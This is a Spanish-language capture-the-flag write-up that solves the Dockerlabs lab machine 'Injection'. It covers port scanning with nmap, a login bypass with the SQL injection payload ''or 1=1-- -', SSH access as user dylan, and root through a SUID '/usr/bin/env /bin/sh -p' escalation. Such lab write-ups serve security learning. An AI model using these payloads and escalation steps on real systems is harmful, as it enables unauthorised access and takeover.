

# Writeup: Injection - Dockerlabs

Hola, bienvenidos y bienvenidas. Vamos a resolver una máquina de la plataforma **Dockerlabs** llamada **"Injection"**.  
A continuación, podrás ver paso a paso cómo se resuelve. ¡Que te diviertas!


  ![Inicio](https://github.com/xavis3c/Writeups-dockerlabs/blob/Recursos/inicio.png)


---

## **Ecaneo de Puertos con Nmap**
Hacemos uso de `nmap` con la IP proporcionada por Dockerlabs para ver los puertos abiertos:  


```
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2
```

```
Host is up (0.000020s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 72:1f:e1:92:70:3f:21:a2:0a:c6:a6:0e:b8:a2:aa:d5 (ECDSA)
|_  256 8f:3a:cd:fc:03:26:ad:49:4a:6c:a1:89:39:f9:7c:22 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Iniciar Sesi\xC3\xB3n
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.52 (Ubuntu)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```
 
Ahora sabemos que el **puerto 80 (HTTP)** y el **puerto 22 (SSH)** están abiertos.

---

## **Acceso a la Aplicación Web**
Nos dirigimos a poner la IP en el navegador.

![login](https://github.com/xavis3c/Writeups-dockerlabs/blob/Recursos/login.png)




  

Como la máquina nos habla de una **inyección** (como su propio nombre lo dice), intentamos hacer una **SQL Injection (SQLi)** con el clásico payload:  

```
'or 1=1-- -
```

**Explicación:**  
Como `1=1` siempre es verdadero, la consulta devuelve todos los registros, permitiendo el acceso sin conocer la contraseña (ponemos cualquier contraseña).  

**¡Sorpresa! Hemos entrado.** 

---

## **Acceso a SSH**
Sabemos que el **puerto 22 (SSH)** está abierto, así que vamos a intentar conectarnos.  

Ejecutamos el siguiente comando:  

```
sudo ssh 172.17.0.2 -l dylan
```

![ssh](https://github.com/xavis3c/Writeups-dockerlabs/blob/Recursos/ssh-entramos.png)




**Explicación de los parámetros:**  
- `sudo` → Ejecuta el comando con permisos de superusuario (root).  
- `ssh` → Inicia una conexión SSH (Secure Shell) para acceder a otro sistema de forma segura.  
- `172.17.0.2` → Es la dirección IP del servidor al que queremos conectarnos.  
- `-l dylan` → Especifica el usuario (`dylan`) con el que nos conectaremos.  

También podemos usar esta otra forma:  

```bash
sudo ssh dylan@172.17.0.2
```

---

## **Escalada de Privilegios**
Ahora que somos **dylan**, intentaremos hacer **escalada de privilegios** hasta ser **superusuario (root)**.  

Ejecutamos en la terminal:  

```bash
find / -perm -4000 -user root 2>/dev/null
```


![escalada](https://github.com/xavis3c/Writeups-dockerlabs/blob/Recursos/escalada.png)




**Explicación del comando:**  
- `find /` → Busca archivos en todo el sistema (`/` es la raíz).  
- `-perm -4000` → Filtra archivos con permiso **SUID** (4000 en octal), lo que permite que el archivo se ejecute con permisos de su propietario (en este caso, root).  
- `-user root` → Filtra para que solo muestre archivos cuyo dueño sea **root**.  
- `2>/dev/null` → Redirige los errores (`stderr`, descriptor `2`) a `/dev/null`, ocultando mensajes de «Permiso denegado».  

### **Archivo interesante encontrado: `/usr/bin/env`**
El binario **env** a veces permite ejecutar comandos como **root**.  
Otros binarios sospechosos suelen ser: `find`, `bash`, `vim`, `less`, `awk`, etc..  

---

## **Uso de GTFOBins para Escalada**
Buscamos el binario **env** en [GTFOBins](https://gtfobins.github.io/) para ver si tiene técnicas conocidas de escalada.  

Encontramos que podemos ejecutar:  

```bash
/usr/bin/env /bin/sh -p
```

¡Y listo! Ahora verificamos con:  

```
whoami
```

![whoami](https://github.com/xavis3c/Writeups-dockerlabs/blob/Recursos/listo-somos-root.png)


**Somos root. Máquina resuelta.**
